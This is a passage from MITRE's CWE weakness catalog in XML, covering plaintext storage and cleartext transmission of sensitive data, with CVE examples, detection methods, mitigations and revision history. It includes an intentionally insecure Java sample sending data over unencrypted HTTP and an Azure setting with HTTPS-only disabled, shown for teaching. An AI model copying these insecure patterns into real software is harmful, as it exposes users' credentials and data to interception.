               <Reference>CVE-2007-5778</Reference>
               <Description>login credentials stored unencrypted in a registry key</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5778</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1481</Reference>
               <Description>Plaintext credentials in world-readable file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1481</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1828</Reference>
               <Description>Password in cleartext in config file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1828</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2209</Reference>
               <Description>Password in cleartext in config file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2209</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1696</Reference>
               <Description>Decrypted copy of a message written to disk given a combination of options and when user replies to an encrypted message.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1696</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2397</Reference>
               <Description>Plaintext storage of private key and passphrase in log file when user imports the key.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2397</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1800</Reference>
               <Description>Admin password in plaintext in a cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1800</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1537</Reference>
               <Description>Default configuration has cleartext usernames/passwords in cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1537</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1536</Reference>
               <Description>Usernames/passwords in cleartext in cookies.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1536</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2160</Reference>
               <Description>Authentication information stored in cleartext in a cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2160</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Plaintext Storage of Sensitive Information</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-2</Entry_ID>
	      <Entry_Name>Req CR 4.1 a)</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 3-3</Entry_ID>
	      <Entry_Name>Req SR 4.1</Entry_Name>
	    </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="37"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 9, &#34;Protecting Secret Data&#34; Page 299"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Encryption&#34;, Page 43"/>
            <Reference External_Reference_ID="REF-172"/>
            <Reference External_Reference_ID="REF-1283"/>
            <Reference External_Reference_ID="REF-1295"/>
            <Reference External_Reference_ID="REF-1296"/>
            <Reference External_Reference_ID="REF-1297"/>
            <Reference External_Reference_ID="REF-1299"/>
            <Reference External_Reference_ID="REF-1301"/>
            <Reference External_Reference_ID="REF-1307" Section="Section 3.2"/>
            <Reference External_Reference_ID="REF-1310"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Terminology">Different people use "cleartext" and "plaintext" to mean the same thing: the lack of encryption. However, within cryptography, these have more precise meanings. Plaintext is the information just before it is fed into a cryptographic algorithm, including already-encrypted text. Cleartext is any information that is unencrypted, although it might be in an encoded form that is not easily human-readable (such as base64 encoding).</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-01-23</Modification_Date>
               <Modification_Comment>updated Abstraction, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships, Type</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Observed_Examples, Potential_Mitigations, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-04-25</Contribution_Date>
               <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
            </Contribution>
            <Previous_Entry_Name Date="2009-01-12">Plaintext Storage of Sensitive Information</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="319" Name="Cleartext Transmission of Sensitive Information" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product transmits sensitive or security-critical data in cleartext in a communication channel that can be sniffed by unauthorized actors.</Description>
         <Extended_Description>
	 <xhtml:p>Many communication channels can be "sniffed" (monitored) by adversaries during data transmission. For example, in networking, packets can traverse many intermediary nodes from the source to the destination, whether across the internet, an internal network, the cloud, etc. Some actors might have privileged access to a network interface or any link along the channel, such as a router, but they might not be authorized to collect the underlying data. As a result, network traffic could be sniffed by adversaries, spilling security-critical data.</xhtml:p>
	 <xhtml:p>Applicable communication channels are not limited to software products. Applicable channels include hardware-specific technologies such as internal hardware networks and external debug channels, supporting remote JTAG debugging. When mitigations are not applied to combat adversaries within the product's threat model, this weakness significantly lowers the difficulty of exploitation by such adversaries.</xhtml:p>
	 <xhtml:p>When full communications are recorded or logged, such as with a packet dump, an adversary could attempt to obtain the dump long after the transmission has occurred and try to "sniff" the cleartext from the recorded communications in the dump itself. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.
</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="311" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="311" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Cloud Computing" Prevalence="Undetermined"/>
            <Technology Class="Mobile" Prevalence="Undetermined"/>
            <Technology Class="ICS/OT" Prevalence="Often"/>
            <Technology Class="System on Chip" Prevalence="Undetermined"/>
            <Technology Name="Test/Debug Hardware" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>For hardware, this may be introduced when design does not plan for an attacker having physical access while a legitimate user is remotely operating the device.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
            <Introduction>
               <Phase>System Configuration</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>Anyone can read the information by gaining access to the channel being used for communication.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-11">
               <Method>Black Box</Method>
               <Description>
                  <xhtml:p>Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process, trigger the feature that sends the data, and look for the presence or absence of common cryptographic functions in the call tree. Monitor the network and determine if the data packets contain readable commands. Tools exist for detecting if certain encodings are in use. If the traffic contains high entropy, this might indicate the usage of encryption.</xhtml:p>
               </Description>
            </Detection_Method>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Before transmitting, encrypt the data using reliable, confidentiality-protecting cryptographic protocols.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When using web applications with SSL, use SSL for the entire session from login to logout, not just for the initial login page.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When designing hardware platforms, ensure that approved encryption algorithms (such as those recommended by NIST) protect paths from security critical data to trusted user applications.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Description>Configure servers to use encrypted channels for communication, which may include SSL or other secure protocols.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-42">
               <Intro_Text>The following code attempts to establish a connection to a site to communicate sensitive information.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>try {<xhtml:div style="margin-left:1em;">URL u = new URL("http://www.secret.example.org/");<xhtml:br/>HttpURLConnection hu = (HttpURLConnection) u.openConnection();<xhtml:br/>hu.setRequestMethod("PUT");<xhtml:br/>hu.connect();<xhtml:br/>OutputStream os = hu.getOutputStream();<xhtml:br/>hu.disconnect();</xhtml:div>}<xhtml:br/>catch (IOException e) {<xhtml:div style="margin-left:1em;">
                           <xhtml:i>//...</xhtml:i>
                           <xhtml:br/>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Though a connection is successfully made, the connection is unencrypted and it is possible that all sensitive data sent to or received from the server will be read by unintended actors.</Body_Text>
            </Demonstrative_Example>
	    <Demonstrative_Example Demonstrative_Example_ID="DX-153">
	      <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
	      <Body_Text>Multiple vendors used cleartext transmission of sensitive information in their OT products.</Body_Text>
	    </Demonstrative_Example>
	    <Demonstrative_Example>
	    <Intro_Text>A TAP accessible register is read/written by a JTAG based tool, for internal use by authorized users. However, an adversary can connect a probing device and collect the values from the unencrypted channel connecting the JTAG interface to the authorized user, if no additional protections are employed.</Intro_Text>
	    </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following Azure CLI command lists the properties of a particular storage account:</Intro_Text>
               <Example_Code Nature="Informative" Language="Shell">
                  <xhtml:div>az storage account show -g {ResourceGroupName} -n {StorageAccountName}</xhtml:div>
               </Example_Code>
	       <Body_Text>The JSON result might be:</Body_Text>
	       <Example_Code Nature="Bad" Language="JSON">
		 <xhtml:div>
		   {<xhtml:br/>
		   <xhtml:div style="margin-left:1em;">
		     "name": "{StorageAccountName}",<xhtml:br/>
		     "enableHttpsTrafficOnly": false,<xhtml:br/>
		     "type": "Microsoft.Storage/storageAccounts"<xhtml:br/>
		   </xhtml:div>
		   }
		 </xhtml:div>
	       </Example_Code>
	       <Body_Text>The enableHttpsTrafficOnly value is set to false, because the default setting for Secure transfer is set to Disabled. This allows cloud storage resources to successfully connect and transfer data without the use of encryption (e.g., HTTP, SMB 2.1, SMB 3.0, etc.).</Body_Text>
	       <Body_Text>Azure's storage accounts can be configured to only accept requests from secure connections made over HTTPS. The secure transfer setting can be enabled using Azure's Portal (GUI) or programmatically by setting the enableHttpsTrafficOnly property to True on the storage account, such as:</Body_Text>
               <Example_Code Nature="Good" Language="Shell">
                  <xhtml:div>az storage account update -g {ResourceGroupName} -n {StorageAccountName} --https-only true</xhtml:div>
               </Example_Code>
	       <Body_Text>The change can be confirmed from the result by verifying that the enableHttpsTrafficOnly value is true:</Body_Text>
	       <Example_Code Nature="Good" Language="JSON">
		 <xhtml:div>
		   {<xhtml:br/>
		   <xhtml:div style="margin-left:1em;">
		     "name": "{StorageAccountName}",<xhtml:br/>
		     "enableHttpsTrafficOnly": true,<xhtml:br/>
		     "type": "Microsoft.Storage/storageAccounts"<xhtml:br/>
		   </xhtml:div>
		   }
		 </xhtml:div>
	       </Example_Code>
	       <Body_Text>
	       <xhtml:p>Note: to enable secure transfer using Azure's Portal instead of the command line:</xhtml:p>
		 <xhtml:ol>
		   <xhtml:li>Open the Create storage account pane in the Azure portal.</xhtml:li>
		   <xhtml:li>In the Advanced page, select the Enable secure transfer checkbox.</xhtml:li>
		 </xhtml:ol>
	     </Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-29519</Reference>
               <Description>Programmable Logic Controller (PLC) sends sensitive information in plaintext, including passwords and session tokens.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29519</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30312</Reference>
               <Description>Building Controller uses a protocol that transmits authentication credentials in plaintext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30312</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-31204</Reference>
               <Description>Programmable Logic Controller (PLC) sends password in plaintext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-31204</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1949</Reference>
               <Description>Passwords transmitted in cleartext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1949</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4122</Reference>
               <Description>Chain: Use of HTTPS cookie without "secure" flag causes it to be transmitted across unencrypted HTTP.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4122</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3289</Reference>
               <Description>Product sends password hash in cleartext in violation of intended policy.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3289</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4390</Reference>
               <Description>Remote management feature sends sensitive information including passwords in cleartext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4390</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5626</Reference>
               <Description>Backup routine sends password in cleartext in email.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5626</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1852</Reference>
               <Description>Product transmits Blowfish encryption key in cleartext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1852</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0374</Reference>
               <Description>Printer sends configuration information, including administrative password, in cleartext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0374</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4961</Reference>
               <Description>Chain: cleartext transmission of the MD5 hash of password enables attacks against a server that is susceptible to replay (CWE-294).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-4961</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4786</Reference>
               <Description>Product sends passwords in cleartext to a log server.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-4786</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3140</Reference>
               <Description>Product sends file with cleartext passwords in e-mail message intended for diagnostic purposes.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3140</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Plaintext Transmission of Sensitive Information</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SEC06-J</Entry_ID>
               <Entry_Name>Do not rely on the default automatic signature verification provided by URLClassLoader and java.util.jar</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SER02-J</Entry_ID>
               <Entry_Name>Sign then seal sensitive objects before sending them outside a trust boundary</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 3-3</Entry_ID>
              <Entry_Name>Req SR 4.1</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 4-2</Entry_ID>
              <Entry_Name>Req CR 4.1B</Entry_Name>
			</Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="102"/>
            <Related_Attack_Pattern CAPEC_ID="117"/>
            <Related_Attack_Pattern CAPEC_ID="383"/>
            <Related_Attack_Pattern CAPEC_ID="477"/>
            <Related_Attack_Pattern CAPEC_ID="65"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-271"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 9, &#34;Protecting Secret Data&#34; Page 299"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 22: Failing to Protect Network Traffic.&#34; Page 337"/>
            <Reference External_Reference_ID="REF-172"/>
            <Reference External_Reference_ID="REF-1283"/>
            <Reference External_Reference_ID="REF-1307" Section="Sections 3.1 and 3.10"/>
            <Reference External_Reference_ID="REF-1309"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
	       <Note Type="Maintenance">The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the "Mapping CWE to 62443" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Likelihood_of_Exploit, Name, Observed_Examples, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
